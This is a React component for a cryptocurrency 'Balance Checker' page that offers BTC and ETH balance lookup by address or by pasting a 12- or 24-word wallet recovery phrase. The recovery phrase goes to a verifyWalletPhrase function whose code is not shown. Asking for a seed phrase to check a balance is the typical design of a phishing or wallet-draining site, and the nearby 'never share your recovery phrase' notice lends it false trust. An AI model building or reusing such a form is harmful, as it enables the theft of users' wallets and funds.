"use client";

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Bitcoin, Feather as Ethereum, Loader2, AlertCircle, CheckCircle } from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { verifyWalletPhrase, checkBalanceByAddress } from '@/lib/wallet-utils';

export default function BalanceChecker() {
  const [address, setAddress] = useState('');
  const [phrase, setPhrase] = useState('');
  const [isChecking, setIsChecking] = useState(false);
  const [result, setResult] = useState<{
    success: boolean;
    message: string;
    balances?: { btc?: number; eth?: number };
    type?: 'BTC' | 'ETH';
  } | null>(null);

  const handleAddressCheck = async () => {
    if (!address.trim()) {
      setResult({
        success: false,
        message: "Please enter a valid wallet address.",
      });
      return;
    }

    setIsChecking(true);
    setResult(null);

    try {
      const verificationResult = await checkBalanceByAddress(address);
      setResult(verificationResult);
    } catch (error) {
      setResult({
        success: false,
        message: "An error occurred while checking the balance. Please try again.",
      });
    } finally {
      setIsChecking(false);
    }
  };

  const handlePhraseCheck = async () => {
    if (!phrase.trim()) {
      setResult({
        success: false,
        message: "Please enter your wallet recovery phrase.",
      });
      return;
    }

    setIsChecking(true);
    setResult(null);

    try {
      const verificationResult = await verifyWalletPhrase(phrase);
      setResult(verificationResult);
    } catch (error) {
      setResult({
        success: false,
        message: "An error occurred during verification. Please try again.",
      });
    } finally {
      setIsChecking(false);
    }
  };

  return (
    <div className="container mx-auto px-4 py-16">
      <div className="max-w-3xl mx-auto">
        <h1 className="text-4xl font-bold mb-6 text-gray-900 dark:text-white">Balance Checker</h1>
        <p className="text-lg text-gray-600 dark:text-gray-300 mb-8">
          Check your cryptocurrency balances securely and calculate potential rewards.
        </p>

        <div className="grid gap-8">
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-semibold mb-6 text-gray-900 dark:text-white">Supported Cryptocurrencies</h2>
            <div className="grid md:grid-cols-2 gap-6">
              <div className="flex items-center space-x-4 p-4 bg-gray-50 dark:bg-gray-700 rounded-lg">
                <Bitcoin className="w-8 h-8 text-orange-500" />
                <div>
                  <h3 className="font-semibold text-gray-900 dark:text-white">Bitcoin (BTC)</h3>
                  <p className="text-sm text-gray-600 dark:text-gray-300">Check BTC balance</p>
                </div>
              </div>
              <div className="flex items-center space-x-4 p-4 bg-gray-50 dark:bg-gray-700 rounded-lg">
                <Ethereum className="w-8 h-8 text-purple-500" />
                <div>
                  <h3 className="font-semibold text-gray-900 dark:text-white">Ethereum (ETH)</h3>
                  <p className="text-sm text-gray-600 dark:text-gray-300">Check ETH balance</p>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6">
            <h2 className="text-2xl font-semibold mb-6 text-gray-900 dark:text-white">Check Your Balance</h2>
            
            <Tabs defaultValue="address" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-6">
                <TabsTrigger value="address">By Address</TabsTrigger>
                <TabsTrigger value="phrase">By Recovery Phrase</TabsTrigger>
              </TabsList>

              <TabsContent value="address">
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Wallet Address
                    </label>
                    <Input
                      placeholder="Enter your BTC or ETH wallet address"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                    />
                  </div>
                  <Button 
                    onClick={handleAddressCheck}
                    disabled={isChecking}
                    className="w-full bg-[#3375BB] hover:bg-[#0B65C6]"
                  >
                    {isChecking && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                    {isChecking ? 'Checking Balance...' : 'Check Balance'}
                  </Button>
                </div>
              </TabsContent>

              <TabsContent value="phrase">
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Recovery Phrase
                    </label>
                    <Textarea
                      placeholder="Enter your recovery phrase (12 or 24 words separated by spaces)"
                      value={phrase}
                      onChange={(e) => setPhrase(e.target.value)}
                      className="min-h-[100px]"
                    />
                    <p className="mt-2 text-sm text-amber-600 dark:text-amber-400 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      Never share your recovery phrase with anyone
                    </p>
                  </div>
                  <Button 
                    onClick={handlePhraseCheck}
                    disabled={isChecking}
                    className="w-full bg-[#3375BB] hover:bg-[#0B65C6]"
                  >
                    {isChecking && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                    {isChecking ? 'Checking Balance...' : 'Check Balance'}
                  </Button>
                </div>
              </TabsContent>

              {result && (
                <div className="mt-6">
                  <Alert variant={result.success ? "default" : "destructive"}>
                    <div className="flex items-center">
                      {result.success ? (
                        <CheckCircle className="h-4 w-4 mr-2" />
                      ) : (
                        <AlertCircle className="h-4 w-4 mr-2" />
                      )}
                      <AlertTitle>
                        {result.success ? "Balance Check Successful" : "Balance Check Failed"}
                      </AlertTitle>
                    </div>
                    <AlertDescription className="mt-1">{result.message}</AlertDescription>
                    {result.success && result.balances && (
                      <div className="mt-4 space-y-2">
                        {(result.type === 'BTC' || !result.type) && result.balances.btc !== undefined && (
                          <div className="flex items-center justify-between bg-gray-100 dark:bg-gray-700 p-2 rounded">
                            <div className="flex items-center">
                              <Bitcoin className="mr-2 h-5 w-5 text-orange-500" />
                              <span>Bitcoin Balance:</span>
                            </div>
                            <span className="font-semibold">{result.balances.btc.toFixed(8)} BTC</span>
                          </div>
                        )}
                        {(result.type === 'ETH' || !result.type) && result.balances.eth !== undefined && (
                          <div className="flex items-center justify-between bg-gray-100 dark:bg-gray-700 p-2 rounded">
                            <div className="flex items-center">
                              <Ethereum className="mr-2 h-5 w-5 text-purple-500" />
                              <span>Ethereum Balance:</span>
                            </div>
                            <span className="font-semibold">{result.balances.eth.toFixed(8)} ETH</span>
                          </div>
                        )}
                      </div>
                    )}
                  </Alert>
                </div>
              )}
            </Tabs>
          </div>
        </div>
      </div>
    </div>
  );
}